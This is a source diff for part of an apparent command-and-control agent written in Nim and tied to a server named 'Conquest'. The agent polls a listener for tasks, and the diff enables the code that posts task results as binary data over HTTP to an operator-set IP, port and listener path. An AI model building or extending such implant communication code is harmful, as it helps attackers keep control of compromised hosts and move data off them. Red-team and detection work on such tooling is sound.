@@ -1,6 +1,7 @@
 import httpclient, json, strformat, asyncdispatch
 
-import ./[types, utils, agentinfo]
+import ./[agentTypes, utils, agentInfo]
+import ../../common/types
 
 proc register*(config: AgentConfig): string = 
 
@@ -44,32 +45,36 @@ proc getTasks*(config: AgentConfig, agent: string): string =
     
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
-        echo "[-] [getTasks]: Listener not reachable."
+        echo "[-] [getTasks]: " & err.msg 
     
     finally:
         client.close()
 
     return ""
 
-proc postResults*(config: AgentConfig, agent: string, taskResult: TaskResult): bool = 
+proc postResults*(config: AgentConfig, taskResult: TaskResult, resultData: seq[byte]): bool = 
     
-    # let client = newAsyncHttpClient()
+    let client = newAsyncHttpClient()
 
-    # # Define headers
-    # client.headers = newHttpHeaders({ "Content-Type": "application/json" })
+    # Define headers
+    client.headers = newHttpHeaders({ 
+        "Content-Type": "application/octet-stream",
+        "Content-Length": $resultData.len
+    })
     
-    # let taskJson = %taskResult
+    let body = resultData.toString()
 
-    # echo $taskJson
+    echo body
 
-    # try:
-    #     # Register agent to the Conquest server
-    #     discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/{taskResult.task}/results", $taskJson)
-    # except CatchableError as err:
-    #     # When the listener is not reachable, don't kill the application, but check in at the next time
-    #     echo "[-] [postResults]: ", err.msg
-    #     return false
-    # finally:
-    #     client.close()
+    try:
+        # Send binary task result data to server
+        discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/{uuidToString(taskResult.listenerId)}/{uuidToString(taskResult.agentId)}/{uuidToString(taskResult.taskId)}/results", body)
+    
+    except CatchableError as err:
+        # When the listener is not reachable, don't kill the application, but check in at the next time
+        echo "[-] [postResults]: " & err.msg
+        return false
+    finally:
+        client.close()
 
     return true
